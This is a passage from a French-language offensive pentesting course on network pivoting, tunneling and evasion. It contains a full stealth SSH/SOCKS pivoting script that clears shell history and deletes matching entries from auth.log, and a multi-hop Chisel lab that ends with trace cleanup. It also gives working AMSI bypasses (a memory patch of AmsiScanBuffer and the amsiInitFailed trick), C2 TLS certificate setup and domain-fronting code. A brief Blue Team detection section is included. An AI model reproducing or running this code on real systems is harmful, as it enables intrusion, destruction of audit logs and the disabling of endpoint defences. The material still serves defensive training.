   curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -H "Accept-Language: en-US,en;q=0.9" https://example.com/
   
   # Configuration de profils de trafic réalistes
   ./agent -connect 192.168.100.10:443 -profile "chrome-browser"
   ```

2. **Utilisation de domaines de confiance**
   ```bash
   # Utilisation de domaines légitimes pour le tunneling DNS
   ./dnscat2 --dns "domain=legitimate-cdn.com"
   
   # Utilisation de services cloud légitimes comme relais
   ./agent -connect legitimate-service.azurewebsites.net
   ```

3. **Techniques anti-forensics**
   ```bash
   # Nettoyage des logs
   for log in /var/log/auth.log /var/log/syslog; do
       if [ -w "$log" ]; then
           grep -v "chisel\|socat\|tunnel" "$log" > "$log.clean"
           cat "$log.clean" > "$log"
           rm "$log.clean"
       fi
   done
   
   # Utilisation de la mémoire plutôt que du disque
   mount -t tmpfs -o size=10m tmpfs /tmp/tunnel
   cd /tmp/tunnel
   ```

#### Script de pivoting OPSEC

Voici un exemple de script pour réaliser un pivoting discret :

```bash
#!/bin/bash
# Script de pivoting discret avec techniques OPSEC

# Configuration
TARGET_HOST="192.168.1.10"
TARGET_PORT="80"
LOCAL_PORT="8080"
PIVOT_HOST="pivot.example.com"
PIVOT_USER="user"
PIVOT_KEY="~/.ssh/id_rsa"
LOG_FILE="/tmp/pivot_log.txt"
JITTER_MIN=5
JITTER_MAX=15

# Fonction de logging discrète
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Fonction pour introduire un délai aléatoire
random_delay() {
    local delay
    delay=$(awk -v min="$JITTER_MIN" -v max="$JITTER_MAX" 'BEGIN{srand(); print min+rand()*(max-min)}')
    log "Waiting for $delay seconds..."
    sleep "$delay"
}

# Fonction pour vérifier si un port est déjà utilisé
check_port() {
    if netstat -tuln | grep -q ":$1 "; then
        log "Port $1 is already in use"
        return 1
    fi
    return 0
}

# Fonction pour vérifier la connectivité
check_connectivity() {
    log "Checking connectivity to pivot host..."
    if ! ping -c 1 -W 2 "$PIVOT_HOST" > /dev/null 2>&1; then
        log "Cannot reach pivot host"
        return 1
    fi
    
    log "Checking SSH connectivity..."
    if ! ssh -i "$PIVOT_KEY" -o ConnectTimeout=5 -o BatchMode=yes -q "$PIVOT_USER@$PIVOT_HOST" exit > /dev/null 2>&1; then
        log "Cannot establish SSH connection"
        return 1
    fi
    
    return 0
}

# Fonction pour établir un tunnel SSH discret
setup_ssh_tunnel() {
    log "Setting up SSH tunnel..."
    
    # Vérifier si le port local est disponible
    if ! check_port "$LOCAL_PORT"; then
        log "Choosing alternative port..."
        LOCAL_PORT=$((LOCAL_PORT + 1))
    fi
    
    # Options SSH pour la furtivité
    SSH_OPTS="-i $PIVOT_KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o TCPKeepAlive=yes -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o IPQoS=throughput"
    
    # Établir le tunnel avec autossh pour la persistance
    if command -v autossh > /dev/null 2>&1; then
        log "Using autossh for persistent tunnel..."
        AUTOSSH_GATETIME=0 autossh -M 0 -f -N -L "$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT" $SSH_OPTS "$PIVOT_USER@$PIVOT_HOST"
        tunnel_pid=$(pgrep -f "autossh.*$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT")
    else
        log "Using standard ssh..."
        ssh -f -N -L "$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT" $SSH_OPTS "$PIVOT_USER@$PIVOT_HOST"
        tunnel_pid=$(pgrep -f "ssh.*$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT")
    fi
    
    if [ -n "$tunnel_pid" ]; then
        log "Tunnel established (PID: $tunnel_pid)"
        return 0
    else
        log "Failed to establish tunnel"
        return 1
    fi
}

# Fonction pour établir un tunnel SOCKS discret
setup_socks_tunnel() {
    log "Setting up SOCKS tunnel..."
    
    # Vérifier si le port local est disponible
    if ! check_port "1080"; then
        log "Choosing alternative port..."
        SOCKS_PORT=1081
    else
        SOCKS_PORT=1080
    fi
    
    # Options SSH pour la furtivité
    SSH_OPTS="-i $PIVOT_KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o TCPKeepAlive=yes -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o IPQoS=throughput"
    
    # Établir le tunnel SOCKS avec autossh pour la persistance
    if command -v autossh > /dev/null 2>&1; then
        log "Using autossh for persistent SOCKS tunnel..."
        AUTOSSH_GATETIME=0 autossh -M 0 -f -N -D "127.0.0.1:$SOCKS_PORT" $SSH_OPTS "$PIVOT_USER@$PIVOT_HOST"
        tunnel_pid=$(pgrep -f "autossh.*-D.*$SOCKS_PORT")
    else
        log "Using standard ssh for SOCKS tunnel..."
        ssh -f -N -D "127.0.0.1:$SOCKS_PORT" $SSH_OPTS "$PIVOT_USER@$PIVOT_HOST"
        tunnel_pid=$(pgrep -f "ssh.*-D.*$SOCKS_PORT")
    fi
    
    if [ -n "$tunnel_pid" ]; then
        log "SOCKS tunnel established (PID: $tunnel_pid) on port $SOCKS_PORT"
        
        # Configuration de proxychains
        if [ -f "/etc/proxychains.conf" ] && [ -w "/etc/proxychains.conf" ]; then
            log "Configuring proxychains..."
            cp /etc/proxychains.conf /tmp/proxychains.conf.bak
            sed -i '/^socks/d' /etc/proxychains.conf
            echo "socks5 127.0.0.1 $SOCKS_PORT" >> /etc/proxychains.conf
        else
            log "Creating custom proxychains configuration..."
            mkdir -p ~/.proxychains
            cat > ~/.proxychains/proxychains.conf << EOF
# proxychains.conf
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 $SOCKS_PORT
EOF
            export PROXYCHAINS_CONF_FILE=~/.proxychains/proxychains.conf
        fi
        
        return 0
    else
        log "Failed to establish SOCKS tunnel"
        return 1
    fi
}

# Fonction pour tester le tunnel
test_tunnel() {
    log "Testing tunnel connectivity..."
    
    random_delay
    
    # Test du tunnel direct
    if curl -s -m 5 -o /dev/null -w "%{http_code}" "http://localhost:$LOCAL_PORT/" > /dev/null 2>&1; then
        log "Direct tunnel is working"
    else
        log "Direct tunnel test failed"
    fi
    
    random_delay
    
    # Test du tunnel SOCKS
    if command -v proxychains > /dev/null 2>&1; then
        if proxychains curl -s -m 5 -o /dev/null -w "%{http_code}" "http://$TARGET_HOST:$TARGET_PORT/" > /dev/null 2>&1; then
            log "SOCKS tunnel is working"
        else
            log "SOCKS tunnel test failed"
        fi
    fi
}

# Fonction pour nettoyer les traces
cleanup_traces() {
    log "Cleaning up traces..."
    
    # Nettoyage de l'historique des commandes
    history -c
    
    # Nettoyage des fichiers temporaires
    if [ -f ~/.bash_history ]; then
        cat /dev/null > ~/.bash_history
    fi
    
    # Restauration de la configuration de proxychains
    if [ -f "/tmp/proxychains.conf.bak" ]; then
        mv /tmp/proxychains.conf.bak /etc/proxychains.conf
    fi
    
    # Nettoyage des logs (si possible)
    if [ -w /var/log/auth.log ]; then
        log "Cleaning auth.log..."
        grep -v "ssh.*$PIVOT_HOST" /var/log/auth.log > /tmp/auth.log.clean
        cat /tmp/auth.log.clean > /var/log/auth.log
        rm /tmp/auth.log.clean
    fi
}

# Fonction pour arrêter les tunnels
stop_tunnels() {
    log "Stopping tunnels..."
    
    # Arrêt des tunnels SSH
    pkill -f "ssh.*$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT"
    pkill -f "ssh.*-D.*$SOCKS_PORT"
    pkill -f "autossh.*$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT"
    pkill -f "autossh.*-D.*$SOCKS_PORT"
    
    log "Tunnels stopped"
}

# Fonction principale
main() {
    log "Starting OPSEC-aware pivoting script"
    
    # Vérification de l'environnement
    if [ "$(id -u)" -eq 0 ]; then
        log "Running as root"
    else
        log "Running as non-root user"
    fi
    
    # Vérification de la connectivité
    if ! check_connectivity; then
        log "Connectivity check failed, exiting"
        exit 1
    fi
    
    random_delay
    
    # Établissement des tunnels
    if ! setup_ssh_tunnel; then
        log "Failed to set up SSH tunnel, exiting"
        exit 1
    fi
    
    random_delay
    
    if ! setup_socks_tunnel; then
        log "Failed to set up SOCKS tunnel, continuing with direct tunnel only"
    fi
    
    random_delay
    
    # Test des tunnels
    test_tunnel
    
    # Affichage des informations de connexion
    log "Tunnel information:"
    log "Direct tunnel: localhost:$LOCAL_PORT -> $TARGET_HOST:$TARGET_PORT"
    log "SOCKS tunnel: 127.0.0.1:$SOCKS_PORT"
    
    echo "Tunnel established:"
    echo "- Direct: curl http://localhost:$LOCAL_PORT/"
    echo "- SOCKS: proxychains curl http://$TARGET_HOST:$TARGET_PORT/"
    
    # Attente de l'interruption par l'utilisateur
    echo "Press Ctrl+C to stop tunnels and clean up"
    trap 'stop_tunnels; cleanup_traces; exit 0' INT
    
    # Maintien des tunnels actifs
    while true; do
        sleep 60
    done
}

# Exécution du script principal
main
```

### Points clés

- Le pivoting et le tunneling sont des techniques essentielles pour naviguer à travers des réseaux segmentés et accéder à des systèmes qui ne sont pas directement accessibles.
- Les techniques de base incluent le port forwarding SSH, l'utilisation de socat, et la création de proxies SOCKS.
- Les techniques avancées comprennent l'utilisation d'outils comme Chisel, Ligolo-ng, et le tunneling via des protocoles comme DNS, ICMP et HTTP/HTTPS.
- Le pivoting dans des environnements spécifiques (Windows, Linux, cloud) nécessite des approches adaptées et la connaissance des outils natifs.
- Les équipes défensives peuvent détecter ces techniques via l'analyse des logs système, réseau et d'authentification.
- Des techniques OPSEC appropriées, comme la limitation du bruit réseau, l'utilisation de délais et de jitter, et le nettoyage des traces, permettent de réduire significativement la détectabilité des opérations de pivoting.

### Mini-quiz (3 QCM)

1. **Quelle commande SSH permet de créer un proxy SOCKS pour router le trafic via un serveur SSH ?**
   - A) ssh -L 1080:localhost:1080 utilisateur@serveur
   - B) ssh -R 1080:localhost:1080 utilisateur@serveur
   - C) ssh -D 1080 utilisateur@serveur
   - D) ssh -X 1080 utilisateur@serveur

   *Réponse : C*

2. **Quelle technique de tunneling est la plus adaptée pour contourner un pare-feu qui bloque tout sauf le trafic DNS sortant ?**
   - A) Tunneling SSH
   - B) Tunneling DNS
   - C) Tunneling ICMP
   - D) Tunneling HTTP

   *Réponse : B*

3. **Quelle commande permet d'ajouter une route dans Metasploit pour accéder à un réseau via une session Meterpreter ?**
   - A) route add 192.168.1.0/24 1
   - B) ip route add 192.168.1.0/24 via session1
   - C) meterpreter > route add 192.168.1.0/24
   - D) set ROUTE 192.168.1.0/24 SESSION=1

   *Réponse : A*

### Lab/Exercice guidé : Pivoting multi-niveau avec SSH et Chisel

#### Objectif
Établir un accès à un réseau interne isolé en utilisant des techniques de pivoting à travers plusieurs niveaux, tout en minimisant les traces et en évitant la détection.

#### Prérequis
- Machine attaquante (Kali Linux)
- Premier pivot (accessible depuis l'attaquant)
- Deuxième pivot (accessible depuis le premier pivot)
- Cible finale (accessible depuis le deuxième pivot)
- SSH et Chisel installés sur les machines

#### Topologie du réseau
```
Attaquant (192.168.100.10) -> Pivot1 (192.168.100.20 / 192.168.1.10) -> Pivot2 (192.168.1.20 / 192.168.2.10) -> Cible (192.168.2.20)
```

#### Étapes

1. **Préparation de l'environnement**

```bash
# Sur la machine attaquante
mkdir -p ~/pivoting_lab
cd ~/pivoting_lab

# Téléchargement de Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64
mv chisel_1.7.7_linux_amd64 chisel

# Création d'un fichier de log
LOG_FILE="pivoting_lab.log"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Lab started" > "$LOG_FILE"

# Fonction de logging
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
    echo "[+] $1"
}

# Fonction pour introduire un délai aléatoire
random_delay() {
    local delay
    delay=$(awk 'BEGIN{srand(); print 2+rand()*3}')
    log "Waiting for $delay seconds..."
    sleep "$delay"
}
```

2. **Premier niveau de pivoting avec SSH**

```bash
# Sur la machine attaquante
log "Setting up first level pivot with SSH"

# Vérification de la connectivité au premier pivot
if ! ping -c 1 -W 2 192.168.100.20 > /dev/null 2>&1; then
    log "Cannot reach first pivot, exiting"
    exit 1
fi

# Création d'un tunnel SSH avec proxy SOCKS
log "Creating SSH SOCKS proxy to first pivot"
ssh -f -N -D 1080 -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" user@192.168.100.20

# Vérification que le tunnel est établi
if pgrep -f "ssh.*-D 1080" > /dev/null; then
    log "SSH SOCKS proxy established"
else
    log "Failed to establish SSH SOCKS proxy, exiting"
    exit 1
fi

# Configuration de proxychains
cat > proxychains.conf << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF

export PROXYCHAINS_CONF_FILE=$(pwd)/proxychains.conf

# Test du premier niveau de pivoting
log "Testing first level pivot"
if proxychains curl -s -m 5 -o /dev/null -w "%{http_code}" http://192.168.1.20:80/ > /dev/null 2>&1; then
    log "First level pivot working, can reach second pivot"
else
    log "Cannot reach second pivot, but continuing"
fi

random_delay
```

3. **Transfert de Chisel au premier pivot**

```bash
# Sur la machine attaquante
log "Transferring Chisel to first pivot"

# Création d'un serveur HTTP temporaire pour le transfert
python3 -m http.server 8000 &
HTTP_SERVER_PID=$!

# Téléchargement de Chisel sur le premier pivot via SSH
ssh user@192.168.100.20 "wget http://192.168.100.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"

# Arrêt du serveur HTTP
kill $HTTP_SERVER_PID

random_delay
```

4. **Deuxième niveau de pivoting avec Chisel**

```bash
# Sur la machine attaquante
log "Setting up second level pivot with Chisel"

# Démarrage du serveur Chisel sur la machine attaquante
./chisel server -p 8080 --reverse &
CHISEL_SERVER_PID=$!

# Attente du démarrage du serveur
sleep 2

# Démarrage du client Chisel sur le premier pivot via SSH
ssh user@192.168.100.20 "/tmp/chisel client 192.168.100.10:8080 R:socks &"

# Vérification que le tunnel Chisel est établi
sleep 5
if netstat -tuln | grep -q ":8080 "; then
    log "Chisel server running"
else
    log "Chisel server not running, exiting"
    exit 1
fi

# Mise à jour de proxychains pour utiliser le tunnel Chisel
cat > proxychains.conf << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF

# Test du deuxième niveau de pivoting
log "Testing second level pivot"
if proxychains curl -s -m 5 -o /dev/null -w "%{http_code}" http://192.168.2.20:80/ > /dev/null 2>&1; then
    log "Second level pivot working, can reach final target"
else
    log "Cannot reach final target, but continuing"
fi

random_delay
```

5. **Transfert de Chisel au deuxième pivot**

```bash
# Sur la machine attaquante
log "Transferring Chisel to second pivot"

# Création d'un serveur HTTP temporaire sur le premier pivot
ssh user@192.168.100.20 "cd /tmp && python3 -m http.server 8000 &"

# Téléchargement de Chisel sur le deuxième pivot via proxychains
proxychains ssh user@192.168.1.20 "wget http://192.168.1.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"

# Arrêt du serveur HTTP sur le premier pivot
ssh user@192.168.100.20 "pkill -f 'python3 -m http.server 8000'"

random_delay
```

6. **Troisième niveau de pivoting avec Chisel**

```bash
# Sur la machine attaquante
log "Setting up third level pivot with Chisel"

# Démarrage du client Chisel sur le deuxième pivot via proxychains
proxychains ssh user@192.168.1.20 "/tmp/chisel client 192.168.1.10:1080 R:socks &"

# Mise à jour de proxychains pour utiliser le tunnel Chisel du troisième niveau
cat > proxychains.conf << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
EOF

# Test du troisième niveau de pivoting
log "Testing third level pivot"
if proxychains curl -s -m 5 -o /dev/null -w "%{http_code}" http://192.168.2.20:80/ > /dev/null 2>&1; then
    log "Third level pivot working, can reach final target"
else
    log "Cannot reach final target, check configuration"
fi

random_delay
```

7. **Exploration du réseau cible**

```bash
# Sur la machine attaquante
log "Exploring target network"

# Scan du réseau cible avec nmap via proxychains
log "Scanning target network"
proxychains nmap -sT -Pn -p 22,80,443,3389 192.168.2.20 -oN scan_results.txt

# Vérification des services web
log "Checking web services"
proxychains curl -s http://192.168.2.20/ > web_content.html

# Tentative de connexion SSH
log "Testing SSH connection"
proxychains ssh -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -o "ConnectTimeout=5" user@192.168.2.20 "id" > ssh_test.txt 2>&1

random_delay
```

8. **Configuration d'un tunnel direct vers la cible**

```bash
# Sur la machine attaquante
log "Setting up direct tunnel to target"

# Création d'un tunnel direct vers le port 80 de la cible
./chisel server -p 8081 --reverse &
CHISEL_SERVER2_PID=$!

# Attente du démarrage du serveur
sleep 2

# Démarrage du client Chisel sur le premier pivot pour créer un tunnel direct
ssh user@192.168.100.20 "/tmp/chisel client 192.168.100.10:8081 R:8080:192.168.2.20:80 &"

# Test du tunnel direct
log "Testing direct tunnel"
if curl -s -m 5 -o /dev/null -w "%{http_code}" http://localhost:8080/ > /dev/null 2>&1; then
    log "Direct tunnel working, can access target web server directly"
    curl -s http://localhost:8080/ > direct_web_content.html
else
    log "Direct tunnel not working"
fi

random_delay
```

9. **Analyse des résultats**

```bash
# Sur la machine attaquante
log "Analyzing results"

# Analyse des résultats du scan
if [ -f scan_results.txt ]; then
    log "Scan results:"
    cat scan_results.txt >> "$LOG_FILE"
fi

# Analyse du contenu web
if [ -f web_content.html ]; then
    log "Web content retrieved via proxychains"
    grep -i "<title>" web_content.html >> "$LOG_FILE"
fi

if [ -f direct_web_content.html ]; then
    log "Web content retrieved via direct tunnel"
    grep -i "<title>" direct_web_content.html >> "$LOG_FILE"
fi

# Analyse du test SSH
if [ -f ssh_test.txt ]; then
    log "SSH test results:"
    cat ssh_test.txt >> "$LOG_FILE"
fi

log "Lab completed successfully"
```

10. **Nettoyage des traces**

```bash
# Sur la machine attaquante
log "Cleaning up"

# Arrêt des serveurs Chisel
if [ -n "$CHISEL_SERVER_PID" ]; then
    kill $CHISEL_SERVER_PID
fi

if [ -n "$CHISEL_SERVER2_PID" ]; then
    kill $CHISEL_SERVER2_PID
fi

# Arrêt des tunnels SSH
pkill -f "ssh.*-D 1080"

# Nettoyage sur le premier pivot
ssh user@192.168.100.20 "rm -f /tmp/chisel; history -c"

# Nettoyage sur le deuxième pivot (si accessible)
proxychains ssh user@192.168.1.20 "rm -f /tmp/chisel; history -c" || true

log "Cleanup completed"

# Résumé final
echo "Lab completed. Results and logs are available in $(pwd)"
echo "- Log file: $LOG_FILE"
echo "- Scan results: scan_results.txt"
echo "- Web content: web_content.html, direct_web_content.html"
echo "- SSH test: ssh_test.txt"
```

#### Vue Blue Team

Dans un environnement réel, cette approche de pivoting multi-niveau générerait des traces détectables :

1. **Logs générés**
   - Connexions SSH depuis des sources externes
   - Processus inhabituels (Chisel) sur les systèmes pivots
   - Trafic réseau entre segments normalement isolés
   - Requêtes HTTP/HTTPS vers des systèmes internes depuis des pivots

2. **Alertes potentielles**
   - Détection de tunnels SSH avec options de forwarding
   - Détection de connexions SOCKS inhabituelles
   - Détection de processus d'écoute sur des ports non standards
   - Détection de trafic entre segments réseau normalement isolés

3. **Contre-mesures possibles**
   - Surveillance des connexions SSH entrantes et sortantes
   - Détection des processus d'écoute inhabituels
   - Analyse du trafic réseau entre segments
   - Restriction des connexions sortantes depuis les systèmes internes

#### Techniques OPSEC appliquées

1. **Limitation du bruit réseau**
   - Utilisation de délais aléatoires entre les actions
   - Limitation des scans et des requêtes
   - Utilisation de tunnels directs pour les services spécifiques

2. **Minimisation des artefacts**
   - Utilisation de fichiers temporaires pour les outils
   - Nettoyage des fichiers et de l'historique après utilisation
   - Utilisation de connexions SSH avec options de furtivité

3. **Utilisation de protocoles légitimes**
   - Tunneling via SSH et HTTP/HTTPS
   - Utilisation de ports standards (80, 443)
   - Évitement des protocoles inhabituels

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir établi un accès à un réseau interne isolé via plusieurs niveaux de pivoting
- Comprendre les techniques de pivoting avec SSH et Chisel
- Savoir comment configurer des tunnels en chaîne pour traverser plusieurs segments réseau
- Apprécier l'importance des techniques OPSEC dans les opérations de pivoting
- Comprendre les traces générées par ces activités et comment les minimiser
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 14 : OPSEC Niveau 2 - Furtivité active

### Introduction : Pourquoi ce thème est important

Après avoir établi les bases de l'hygiène opérationnelle (OPSEC Niveau 1), ce chapitre introduit des techniques de furtivité active (OPSEC Niveau 2). L'objectif n'est plus seulement de cloisonner et de gérer les identités, mais de masquer activement les actions offensives pour échapper à la détection par les systèmes de sécurité modernes (EDR, NIDS, SIEM). Nous explorerons des techniques comme le chiffrement TLS personnalisé, le contournement des mécanismes de détection sur les endpoints (AMSI, EDR), et l'adaptation du trafic réseau pour paraître légitime (traffic shaping Nmap). La maîtrise de ces techniques est essentielle pour mener des opérations de pentesting avancées sans déclencher d'alertes prématurées, permettant ainsi d'atteindre des objectifs plus profonds dans l'environnement cible.

### Chiffrement TLS personnalisé

Le chiffrement TLS standard utilisé par de nombreux outils C2 (Command and Control) peut être détecté par les solutions de sécurité via l'analyse des certificats, des empreintes JA3/JA3S, ou des patterns de communication. La personnalisation du chiffrement TLS permet de masquer ces indicateurs.

#### Indicateurs TLS détectables

1. **Certificats auto-signés ou suspects**
   - Certificats avec des informations génériques ou invalides (CN, organisation)
   - Certificats émis par des autorités de certification non reconnues
   - Utilisation répétée du même certificat pour différentes communications C2

2. **Empreintes JA3/JA3S**
   - JA3 : Empreinte basée sur les paramètres du Client Hello TLS (versions TLS, chiffrements proposés, extensions, courbes elliptiques)
   - JA3S : Empreinte basée sur les paramètres du Server Hello TLS (version TLS choisie, chiffrement choisi, extensions)
   - Les outils C2 ont souvent des empreintes JA3/JA3S connues et détectables

3. **Patterns de communication**
   - Beaconing régulier avec des intervalles fixes
   - Taille de paquets constante ou prévisible
   - Utilisation de ports non standards pour TLS (autre que 443)

#### Techniques de personnalisation

1. **Utilisation de certificats légitimes (Let's Encrypt)**
   - Obtention de certificats TLS gratuits et reconnus pour les domaines C2
   - Rend le trafic C2 plus difficile à distinguer du trafic légitime
   
   ```bash
   # Installation de Certbot
   sudo apt update
   sudo apt install certbot python3-certbot-nginx
   
   # Obtention d'un certificat pour un domaine (nécessite un serveur web configuré)
   sudo certbot --nginx -d c2.example.com
   
   # Utilisation des certificats générés dans les outils C2
   # (Exemple: Cobalt Strike Malleable C2 profile)
   https-certificate {
       set keystore "/path/to/keystore.jks";
       set password "password";
   }
   ```

2. **Modification des paramètres TLS (JA3/JA3S Spoofing)**
   - Modification des chiffrements, extensions, et versions TLS proposés par le client C2 pour imiter un navigateur légitime
   - Utilisation d'outils ou de bibliothèques permettant de contrôler finement les paramètres TLS
   
   ```python
   # Exemple avec la bibliothèque Python 'requests' et 'pyopenssl'
   import requests
   from requests.adapters import HTTPAdapter
   from requests.packages.urllib3.util.ssl_ import create_urllib3_context
   
   # Définir les chiffrements souhaités (imiter Chrome par exemple)
   # Liste des chiffrements Chrome: https://tls.browserleaks.com/json
   CIPHERS = (
       'ECDHE-ECDSA-AES128-GCM-SHA256:'
       'ECDHE-RSA-AES128-GCM-SHA256:'
       # ... (liste complète)
   )
   
   class CustomTLSAdapter(HTTPAdapter):
       def init_poolmanager(self, *args, **kwargs):
           context = create_urllib3_context(ciphers=CIPHERS)
           kwargs['ssl_context'] = context
           return super(CustomTLSAdapter, self).init_poolmanager(*args, **kwargs)
   
   session = requests.Session()
   session.mount('https://', CustomTLSAdapter())
   
   try:
       response = session.get('https://c2.example.com')
       print(response.text)
   except requests.exceptions.SSLError as e:
       print(f"SSL Error: {e}")
   ```

3. **Utilisation de Socat/Chisel pour le tunneling TLS personnalisé**
   - Création de tunnels TLS avec des paramètres personnalisés en utilisant des outils comme Socat ou Chisel
   - Permet de masquer le trafic C2 derrière un tunnel TLS apparemment légitime
   
   ```bash
   # Sur le serveur C2 (écoute sur localhost:8000)
   
   # Sur le serveur relais (accessible depuis l'extérieur)
   # Générer un certificat légitime (ex: Let's Encrypt)
   
   # Tunnel Socat avec certificat légitime
   socat OPENSSL-LISTEN:443,cert=/etc/letsencrypt/live/c2.example.com/fullchain.pem,key=/etc/letsencrypt/live/c2.example.com/privkey.pem,fork TCP:localhost:8000
   
   # Tunnel Chisel avec certificat légitime
   # (Nécessite une configuration spécifique de Chisel pour utiliser des certificats externes)
   ```

4. **Domain Fronting**
   - Masquage du véritable domaine C2 derrière un domaine légitime et de confiance (ex: CDN comme Cloudflare, Akamai)
   - La requête initiale vise le domaine légitime, mais l'en-tête `Host` pointe vers le domaine C2
   - De plus en plus difficile à réaliser car les CDN bloquent cette technique
   
   ```python
   # Exemple avec requests
   import requests
   
   headers = {
       'Host': 'c2.example.com'  # Domaine C2 réel
   }
   
   # Requête vers le domaine de fronting (ex: un domaine sur Cloudflare)
   response = requests.get('https://legitimate-domain-on-cdn.com', headers=headers)
   print(response.text)
   ```

### Contournement AMSI/EDR

AMSI (Antimalware Scan Interface) et les EDR (Endpoint Detection and Response) sont des mécanismes de sécurité clés sur les systèmes Windows modernes, conçus pour détecter et bloquer les activités malveillantes, notamment l'exécution de scripts et de payloads.

#### AMSI (Antimalware Scan Interface)

1. **Fonctionnement d'AMSI**
   - Interface permettant aux applications (PowerShell, WScript, etc.) de soumettre du contenu (scripts, commandes) à l'antivirus installé pour analyse avant exécution
   - L'antivirus analyse le contenu à la recherche de signatures ou de comportements malveillants
   - Si détecté, l'exécution est bloquée

2. **Techniques de contournement d'AMSI (AMSI Bypass)**
   - **Obfuscation** : Modification du code pour qu'il ne corresponde plus aux signatures connues, tout en conservant sa fonctionnalité (renommage de variables, ajout de commentaires, encodage, etc.)
   
   ```powershell
   # Exemple d'obfuscation simple
   $command = "Write-Host 'Hello, AMSI!'"
   $encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
   Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand)))
   ```
   
   - **Fragmentation** : Division du code malveillant en petits morceaux qui, pris individuellement, ne sont pas détectés
   
   ```powershell
   # Exemple de fragmentation
   $part1 = "Write-"
   $part2 = "Host"
   $part3 = " 'Hello, AMSI!'"
   $command = $part1 + $part2 + $part3
   Invoke-Expression $command
   ```
   
   - **Patching en mémoire (Memory Patching)** : Modification de la fonction `AmsiScanBuffer` ou `AmsiScanString` en mémoire pour qu'elle retourne toujours un résultat "non détecté"
   
   ```powershell
   # Exemple de bypass par patching (souvent détecté par les EDR)
   $Win32 = @"
   using System;
   using System.Runtime.InteropServices;
   public class Win32 {
       [DllImport("kernel32")]
       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
       [DllImport("kernel32")]
       public static extern IntPtr LoadLibrary(string name);
       [DllImport("kernel32")]
       public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
   }
   "@
   Add-Type $Win32
   
   $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
   $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
   $p = 0
   [Win32]::VirtualProtect($Address, [UIntPtr]5, 0x40, [ref]$p)
   $Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
   [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
   ```
   
   - **Utilisation de COM Hijacking** : Détournement d'objets COM pour contourner l'analyse AMSI
   
   - **Forcer une erreur dans AMSI** : Provoquer une erreur dans l'initialisation d'AMSI (`amsiInitFailed`)
   
   ```powershell
   # Forcer amsiInitFailed (méthode courante et souvent détectée)
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```

3. **Outils d'automatisation d'AMSI Bypass**
   - AMSI.fail (site web générant des payloads obfusqués)
   - Invoke-Obfuscation (framework PowerShell)
   - Divers scripts disponibles sur GitHub (attention à leur fiabilité et détectabilité)

#### EDR (Endpoint Detection and Response)

1. **Fonctionnement des EDR**
   - Surveillance continue des activités sur les endpoints (création de processus, connexions réseau, accès fichiers, modifications registre)
   - Utilisation de techniques avancées : analyse comportementale, machine learning, threat intelligence
   - Capacités de réponse : isolation de l'hôte, terminaison de processus, suppression de fichiers
   - Hooking des API Windows (user-mode et kernel-mode) pour intercepter les appels système

2. **Techniques de contournement d'EDR**
   - **Contournement des hooks User-Mode** :
     - **Unhooking** : Suppression des hooks placés par l'EDR sur les fonctions API dans les DLL chargées (ex: ntdll.dll)
     - **Direct System Calls** : Appel direct des fonctions du noyau (syscalls) au lieu des fonctions API de haut niveau (ex: `NtCreateProcess` au lieu de `CreateProcess`)
     - **Indirect System Calls** : Utilisation de techniques pour masquer les appels système directs
     - **Module Stomping / DLL Hollowing** : Écrasement de la mémoire d'une DLL légitime chargée avec du code malveillant
   
   ```csharp
   // Exemple simplifié de Direct System Call (nécessite des définitions de structures et P/Invoke)
   // Obtenir le numéro de syscall pour NtAllocateVirtualMemory
   // ... code pour trouver le numéro de syscall ...
   
   // Préparer les arguments
